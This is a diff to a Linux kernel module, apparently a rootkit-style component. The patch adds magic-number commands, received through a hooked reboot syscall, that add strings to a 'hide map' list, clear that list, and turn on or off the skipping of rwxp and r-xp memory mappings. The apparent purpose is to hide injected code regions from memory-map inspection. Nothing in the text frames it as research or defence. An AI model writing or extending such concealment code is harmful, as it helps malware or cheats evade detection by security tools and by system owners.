@@ -9,12 +9,14 @@
 #include <linux/smp.h>
 #include <linux/printk.h>
 
-#define DEF_MAGIC 0x11111111
-#define PRINT_ARG 1
-#define CUSTOM_CMD1 11001 // add to list
-#define CUSTOM_CMD2 11002 // destroy list
-#define CUSTOM_CMD3 11003 // skip rwxp enable
-#define CUSTOM_CMD4 11004 // skip rwxp disable
+#define DEF_MAGIC					0x11111111
+#define PRINT_ARG					1
+#define CMD_ADD_TO_HIDE_MAP_LIST	0x11001
+#define CMD_CLEAR_HIDE_MAP_LIST		0x11002
+#define CMD_SKIP_RWXP_ENABLE		0x11003
+#define CMD_SKIP_RWXP_DISABLE		0x11004
+#define CMD_SKIP_RXP_ENABLE			0x11005
+#define CMD_SKIP_RXP_DISABLE		0x11006
 
 struct string_entry {
     char *string;
@@ -23,7 +25,9 @@ struct string_entry {
 LIST_HEAD(string_list);
 
 atomic_t skip_rwxp = ATOMIC_INIT(0);
+atomic_t skip_rxp = ATOMIC_INIT(0);
 EXPORT_SYMBOL(skip_rwxp); 
+EXPORT_SYMBOL(skip_rxp); 
 
 static void __exit reboot_lkm_exit(void) 
 {
@@ -57,7 +61,7 @@ int lkm_handle_sys_reboot(int magic1, int magic2, unsigned int cmd, void __user 
 		pr_info("LKM: print %s\n", buf);
 	}
 
-	if (magic2 == CUSTOM_CMD1) {
+	if (magic2 == CMD_ADD_TO_HIDE_MAP_LIST) {
 		memzero_explicit(buf, 256);
 		struct string_entry *new_entry, *entry;
 		if (copy_from_user(buf, (const char __user *)arg, sizeof(buf) - 1))
@@ -90,7 +94,7 @@ int lkm_handle_sys_reboot(int magic1, int magic2, unsigned int cmd, void __user 
 
 	}
 	
-	if (magic2 == CUSTOM_CMD2) {
+	if (magic2 == CMD_CLEAR_HIDE_MAP_LIST) {
 		struct string_entry *entry, *tmp;
 
 		list_for_each_entry_safe(entry, tmp, &string_list, list) {
@@ -102,15 +106,26 @@ int lkm_handle_sys_reboot(int magic1, int magic2, unsigned int cmd, void __user 
         	smp_mb();
 	}
 
-	if (magic2 == CUSTOM_CMD3) {
+	if (magic2 == CMD_SKIP_RWXP_ENABLE) {
 		atomic_set(&skip_rwxp, 1);
 		pr_info("LKM: skip_rwxp: 1\n");
 
 	}
 
-	if (magic2 == CUSTOM_CMD4) {
+	if (magic2 == CMD_SKIP_RWXP_DISABLE) {
 		atomic_set(&skip_rwxp, 0);
 		pr_info("LKM: skip_rwxp: 0\n");
+	}
+
+	if (magic2 == CMD_SKIP_RXP_ENABLE) {
+		atomic_set(&skip_rxp, 1);
+		pr_info("LKM: skip_r-xp: 1\n");
+
+	}
+
+	if (magic2 == CMD_SKIP_RXP_DISABLE) {
+		atomic_set(&skip_rxp, 0);
+		pr_info("LKM: skip_r-xp: 0\n");
 	}
 
 	return 0;
